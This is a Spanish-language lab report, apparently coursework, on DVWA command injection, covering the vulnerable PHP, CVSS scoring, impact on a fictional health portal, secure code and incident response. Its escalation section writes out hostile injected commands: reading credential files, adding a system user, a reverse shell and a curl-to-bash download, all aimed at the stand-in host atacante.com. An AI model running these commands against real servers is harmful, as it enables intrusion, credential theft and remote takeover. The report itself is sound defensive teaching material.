# Vulnerabilidad 03 — Inyección de Comandos del Sistema

**Módulo DVWA:** Command Injection  
**Nivel de seguridad:** Low  
**Categoría OWASP:** A03:2021 – Injection  

---

## 1. Evidencia del Ataque

### Payload utilizado

```
127.0.0.1; cat /etc/passwd
```

### Procedimiento

1. Ingresar al módulo **Command Injection** de DVWA
2. En el campo de dirección IP, introducir: `127.0.0.1; cat /etc/passwd`
3. Hacer clic en **Submit**
4. Observar que el servidor ejecuta el `ping` normal **y además** muestra el contenido del archivo `/etc/passwd`

### Captura de pantalla

![Evidencia de Inyección de Comandos en DVWA](/img_vilari/cmdi_evidencia.png)

> **Nota:** Reemplazar con la captura real obtenida de DVWA.

---

## 2. Explicación Técnica

### ¿Por qué funciona este ataque?

La aplicación utiliza la función `exec()` del sistema operativo para ejecutar el comando `ping` con el argumento proporcionado por el usuario:

**Código PHP vulnerable (simplificado):**
```php
// INSEGURO
$output = shell_exec("ping -c 4 " . $_POST['ip']);
echo $output;
```

Al inyectar `127.0.0.1; cat /etc/passwd`, el comando que ejecuta el servidor es:

```bash
ping -c 4 127.0.0.1; cat /etc/passwd
```

El operador `;` en Unix separa comandos secuenciales. El servidor ejecuta ambos: el `ping` legítimo **y** el `cat /etc/passwd` del atacante.

### Operadores de encadenamiento de comandos

| Operador | Comportamiento |
|---|---|
| `;` | Ejecuta ambos comandos independientemente del resultado anterior |
| `&&` | Ejecuta el segundo solo si el primero tuvo éxito |
| `\|\|` | Ejecuta el segundo solo si el primero falló |
| `\|` (pipe) | Pasa la salida del primero como entrada del segundo |
| `` `cmd` `` | Sustitución de comandos (en shells) |

### Escalada del ataque — de `cat` a control total

```bash
# Listado del sistema de archivos
127.0.0.1; ls -la /var/www/html

# Leer configuración con credenciales de DB
127.0.0.1; cat /var/www/html/config.php

# Crear usuario del sistema
127.0.0.1; useradd atacante && echo 'atacante:pass123' | chpasswd

# Reverse shell (conexión hacia el atacante)
127.0.0.1; bash -i >& /dev/tcp/atacante.com/4444 0>&1

# Descargar y ejecutar malware
127.0.0.1; curl https://atacante.com/malware.sh | bash
```

Con una **reverse shell**, el atacante obtiene un terminal interactivo en el servidor de SaludOnline con los mismos permisos que el proceso web.

---

## 3. Puntuación CVSS 3.1

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

| Métrica | Valor | Justificación |
|---|---|---|
| Attack Vector (AV) | Network (N) | El portal es accesible por Internet |
| Attack Complexity (AC) | Low (L) | El payload es trivial; cualquier operador de shell funciona |
| Privileges Required (PR) | None (N) | No requiere cuenta ni autenticación |
| User Interaction (UI) | None (N) | El atacante actúa de forma autónoma |
| Scope (S) | Changed (C) | Afecta al sistema operativo del servidor, fuera del alcance de la aplicación web |
| Confidentiality (C) | High (H) | Acceso completo a todos los archivos del servidor |
| Integrity (I) | High (H) | Puede modificar, eliminar o crear cualquier archivo del sistema |
| Availability (A) | High (H) | Puede apagar el servidor, eliminar la base de datos o instalar ransomware |

### **Puntuación Base: 10.0 — CRÍTICA**

---

## 4. Impacto Específico en SaludOnline

La inyección de comandos es el ataque más grave posible, pues otorga al atacante **control total del servidor**. En SaludOnline, esto significa:

- **Exfiltración masiva de datos:** Copia completa de la base de datos de pacientes, incluyendo fichas clínicas, recetas e historial médico de miles de personas
- **Robo de credenciales del sistema:** Acceso a claves de conexión a la DB, APIs de terceros (Fonasa, Isapres), certificados digitales de firma de recetas
- **Instalación de ransomware:** Cifrado de todos los datos del servidor, paralizando completamente las operaciones de telemedicina
- **Persistencia a largo plazo:** El atacante puede instalar un backdoor y monitorear el sistema durante meses sin ser detectado
- **Comprometer a terceros:** Utilizar el servidor de SaludOnline para atacar a otros sistemas de salud con los que tiene integraciones
- **Alteración de recetas médicas:** Modificar directamente los archivos de recetas en el servidor, con potencial daño a pacientes si se prescriben medicamentos incorrectos

---

## 5. Política de Prevención

> **POL-CMD-01:** Ningún componente de la aplicación web deberá invocar directamente funciones del sistema operativo (`exec`, `shell_exec`, `system`, `popen`, `proc_open`) con parámetros provenientes de la entrada del usuario. Si se requiere ejecutar comandos del sistema, deberá utilizarse la API nativa del lenguaje de programación o una librería segura aprobada.

### Implementación técnica

**Código vulnerable:**
```php
// INSEGURO
$output = shell_exec("ping -c 4 " . $_POST['ip']);
```

**Código seguro — validación estricta de tipo:**
```php
// SEGURO: validar que sea una IP válida antes de usar
$ip = $_POST['ip'];
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Error: Dirección IP no válida.");
}
// Usar la función nativa del sistema, nunca shell_exec
$output = [];
exec("ping -c 4 " . escapeshellarg($ip), $output);
```

**Mejor práctica — usar API nativa:**
```python
# Python: usar subprocess con lista de argumentos (sin shell=True)
import subprocess
result = subprocess.run(
    ["ping", "-c", "4", ip_address],
    capture_output=True, text=True, timeout=10
)
```

---

## 6. Control de Mitigación

| Control | Descripción | Efectividad |
|---|---|---|
| Principio de mínimo privilegio | El proceso web debe correr como usuario sin privilegios (no root) | Muy Alta |
| Contenedores (Docker) | Aislar el servidor web en un contenedor limita el impacto | Muy Alta |
| `escapeshellarg()` | Si se debe usar shell_exec, escapar siempre el argumento | Alta |
| Allowlist de entradas | Solo aceptar IPs que cumplan una expresión regular estricta | Alta |
| AppArmor / SELinux | Perfiles de seguridad del kernel que restringen qué comandos puede ejecutar el proceso | Alta |
| Detección de anomalías | Monitorear procesos hijos del servidor web (spawn de bash, curl, etc.) | Media |

---

## 7. Plan de Recuperación ante Incidente

Si se detecta una explotación activa de Command Injection:

1. **Contener (inmediato):** Desconectar el servidor de Internet; tomar snapshot forense del sistema antes de cualquier modificación
2. **Aislar (0-1h):** Poner en cuarentena el servidor comprometido; activar servidor de respaldo limpio
3. **Investigar (1-8h):** Analizar logs de sistema (`/var/log/auth.log`, `apache2/access.log`) para determinar el alcance. Buscar backdoors, crontabs modificados y nuevos usuarios del sistema
4. **Notificar (4-24h):** Reportar al CSIRT de Gobierno; notificar a los pacientes cuyos datos pueden haber sido exfiltrados
5. **Restaurar (24-72h):** Reconstruir el servidor desde imagen base; restaurar datos desde backup previo al incidente; aplicar parche de validación de entrada
6. **Endurecer (post-incidente):** Contenedorizar la aplicación; implementar WAF; configurar AppArmor; contratar auditoría de penetración externa
